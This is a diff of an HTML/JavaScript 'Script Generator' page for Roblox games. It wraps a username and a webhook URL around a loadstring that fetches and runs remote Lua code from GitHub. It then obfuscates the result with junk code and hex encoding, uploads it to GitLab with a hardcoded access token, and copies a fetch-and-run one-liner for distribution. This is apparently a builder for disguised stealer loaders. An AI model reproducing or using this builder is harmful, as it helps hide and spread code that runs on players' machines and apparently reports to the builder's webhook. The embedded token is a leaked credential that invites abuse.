@@ -1,184 +1,184 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Script Generator</title>
-<style>
-body {
-  background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
-  color: white;
-  font-family: Arial, sans-serif;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-  flex-direction: column;
-  margin: 0;
-}
-h1 {
-   font-size: 3rem;
-}
-.container {
-  display: flex;
-  flex-direction: column;
-  gap: 15px;
-  margin-top: 20px;
-  text-align: center;
-  background: rgba(0, 0, 0, 0.7);
-  padding: 20px;
-  border-radius: 10px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-}
-input, select, button {
-  padding: 10px;
-  border-radius: 8px;
-  border: none;
-  background-color: #333;
-  color: white;
-  font-size: 1rem;
-  width: 250px;
-}
-button {
-  background: #ff0080;
-  cursor: pointer;
-  transition: 0.3s;
-}
-button:hover {
-  background: #ff0055;
-  transform: scale(1.1);
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Script Generator</title>
+    <style>
+        body {
+            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin: 0;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        input, select, button {
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            background-color: #333;
+            color: white;
+            font-size: 1rem;
+            width: 250px;
+        }
+        button {
+            background: #ff0080;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #ff0055;
+            transform: scale(1.1);
+        }
+    </style>
 </head>
 <body>
+
 <h1>Script Generator</h1>
 <div class="container">
-  <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
-  <input type="text" id="webhook" placeholder="Enter Webhook URL">
-  <select id="script-select">
-    <option value="Blox Fruits">Blox Fruits</option>
-    <option value="Pet Simulator 99">Pet Simulator 99</option>
-    <option value="Pls Donate">Pls Donate</option>
-  </select>
-  <button onclick="generateScript()">Generate Script</button>
+    <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
+    <input type="text" id="webhook" placeholder="Enter Webhook URL">
+    <select id="script-select">
+        <option value="Blox Fruits">Blox Fruits</option>
+        <option value="Pet Simulator 99">Pet Simulator 99</option>
+        <option value="Pls Donate">Pls Donate</option>
+    </select>
+    <button onclick="generateScript()">Generate Script</button>
 </div>
+
 <script>
-const PAT = 'glpat-8si5orFgbXbJE4uzHwKS';
-const projectID = '67450323';
+const PAT = 'glpat-8si5orFgbXbJE4uzHwKS';  
+const projectID = '67450323';  
 
 const loadstrings = {
-  "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
-  "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
-  "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
+    "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
+    "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
+    "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
 };
 
-function randomString(length) { 
-  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
-  let result = ''; 
-  for (let i = 0; i < length; i++) { 
-    result += chars.charAt(Math.floor(Math.random() * chars.length)); 
-  } 
-  return result; 
+function randomString(length) {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
 }
 
-function junkCode() { 
-  let junk = [
-    "local _unused = math.random()",
-    "local __dummy = string.reverse('dummy')",
-    "local __junk = 'OBF'..tostring(math.random(1000,9999))"
-  ]; 
-  return junk[Math.floor(Math.random() * junk.length)]; 
+function junkCode() {
+    let junk = [
+        "local _unused = math.random()",
+        "local __dummy = string.reverse('dummy')",
+        "local __junk = 'OBF'..tostring(math.random(1000,9999))"
+    ];
+    return junk[Math.floor(Math.random() * junk.length)];
 }
 
-function obfuscateScript(script) { 
-  script = script.replace(/;/g, ";\n" + junkCode());
+function obfuscateScript(script) {
+    // Add junk code for obfuscation
+    script = script.replace(/;/g, ";\n" + junkCode());
 
-  // Basic renaming
-  const replacements = { 
-    "Username": randomString(10), 
-    "Webhook": randomString(10), 
-    "loadstring": randomString(10), 
-    "game": randomString(10), 
-    "HttpGet": randomString(10) 
-  }; 
+    // Basic renaming
+    const replacements = {
+        "Username": randomString(10),
+        "Webhook": randomString(10),
+        "loadstring": randomString(10),
+        "game": randomString(10),
+        "HttpGet": randomString(10)
+    };
 
-  for (const original in replacements) { 
-    const replacement = replacements[original]; 
-    script = script.replace(new RegExp(original, "g"), replacement); 
-  }
+    for (const original in replacements) {
+        const replacement = replacements[original];
+        script = script.replace(new RegExp(original, "g"), replacement);
+    }
 
-  // Hide username and webhook using string manipulation
-  let username = document.getElementById('username').value; 
-  let webhook = document.getElementById('webhook').value;
+    // Hide username and webhook using string manipulation
+    let username = document.getElementById('username').value;
+    let webhook = document.getElementById('webhook').value;
 
-  let encodedUsername = encodeURIComponent(username).split('').map(c => c.charCodeAt(0).toString(16)).join('%');
-  let encodedWebhook = encodeURIComponent(webhook).split('').map(c => c.charCodeAt(0).toString(16)).join('%');
+    let encodedUsername = encodeURIComponent(username);
+    let encodedWebhook = encodeURIComponent(webhook);
 
-  let obfuscatedUsername = `string.char(${encodedUsername.split('%').filter(Boolean).map(c => `0x${c}`).join(',')})`; 
-  let obfuscatedWebhook = `string.char(${encodedWebhook.split('%').filter(Boolean).map(c => `0x${c}`).join(',')})`;
+    let obfuscatedUsername = `string.char(${encodedUsername.split('').map(c => c.charCodeAt(0)).join(',')})`;
+    let obfuscatedWebhook = `string.char(${encodedWebhook.split('').map(c => c.charCodeAt(0)).join(',')})`;
 
-  script = script.replace(new RegExp(replacements["Username"], "g"), obfuscatedUsername); 
-  script = script.replace(new RegExp(replacements["Webhook"], "g"), obfuscatedWebhook);
+    script = script.replace(new RegExp(replacements["Username"], "g"), obfuscatedUsername);
+    script = script.replace(new RegExp(replacements["Webhook"], "g"), obfuscatedWebhook);
 
-  // Hex obfuscation
-  script = script.replace(/"/g, "'"); // Temporarily replace double quotes
-  let hexObfuscated = script.split('').map(char => `0x${char.charCodeAt(0).toString(16)}`).join(',');
-  script = `string.char(${hexObfuscated})`;
+    // Hex obfuscation
+    let hexObfuscated = script.split('').map(char => `0x${char.charCodeAt(0).toString(16)}`).join(',');
+    script = `string.char(${hexObfuscated})`;
 
-  // Control flow obfuscation
-  const obfuscatedScript = `return function() ${script} end`;
-
-  return obfuscatedScript; 
+    // Control flow obfuscation
+    return `return function() ${script} end`;
 }
 
-function generateScript() { 
-  let username = document.getElementById('username').value; 
-  let webhook = document.getElementById('webhook').value; 
-  let selectedScript = document.getElementById('script-select').value; 
+function generateScript() {
+    let username = document.getElementById('username').value;
+    let webhook = document.getElementById('webhook').value;
+    let selectedScript = document.getElementById('script-select').value;
 
-  if (!username || !webhook) { 
-    alert("Please enter both Username and Webhook URL!"); 
-    return; 
-  }
+    if (!username || !webhook) {
+        alert("Please enter both Username and Webhook URL!");
+        return;
+    }
 
-  let script = `Username = "${username}" Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
-  let obfuscatedScript = obfuscateScript(script);
+    let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
+    let obfuscatedScript = obfuscateScript(script);
 
-  uploadToGitLab(obfuscatedScript); 
+    uploadToGitLab(obfuscatedScript);
 }
 
-function uploadToGitLab(content) { 
-  let filename = `${randomString(10)}.lua`; 
+function uploadToGitLab(content) {
+    let filename = `${randomString(10)}.lua`;
 
-  fetch(`https://gitlab.com/api/v4/projects/${projectID}/repository/files/${encodeURIComponent(filename)}`, { 
-    method: 'POST', 
-    headers: { 
-      'PRIVATE-TOKEN': PAT, 
-      'Content-Type': 'application/json' 
-    }, 
-    body: JSON.stringify({ 
-      branch: 'main', 
-      content: btoa(content), 
-      commit_message: 'Add obfuscated script' 
-    }) 
-  })
-  .then(response => response.json()) 
-  .then(data => { 
-    if (data.file_path) { 
-      let loadstring = `loadstring(game:HttpGet('https://gitlab.com/void6674109/Void/-/raw/main/${filename}'))()`;
-
-      navigator.clipboard.writeText(loadstring).then(() => { 
-        alert("Script uploaded & Loadstring copied!\n" + loadstring); 
-      }); 
-    } else { 
-      alert("Upload failed. Check PAT & Project ID."); 
-    } 
-  })
-  .catch(error => { 
-    console.error('Upload Error:', error); 
-    alert("Error uploading. Check console."); 
-  }); 
-} 
+    fetch(`https://gitlab.com/api/v4/projects/${projectID}/repository/files/${encodeURIComponent(filename)}`, {
+        method: 'POST',
+        headers: {
+            'PRIVATE-TOKEN': PAT,
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            branch: 'main',
+            content: btoa(content),
+            commit_message: 'Add obfuscated script'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.file_path) {
+            let loadstring = `loadstring(game:HttpGet('https://gitlab.com/void6674109/Void/-/raw/main/${filename}'))()`;
+            navigator.clipboard.writeText(loadstring).then(() => {
+                alert("Script uploaded & Loadstring copied!\n" + loadstring);
+            });
+        } else {
+            alert("Upload failed. Check PAT & Project ID.");
+        }
+    })
+    .catch(error => {
+        console.error('Upload Error:', error);
+        alert("Error uploading. Check console.");
+    });
+}
 </script>
+
 </body>
 </html>
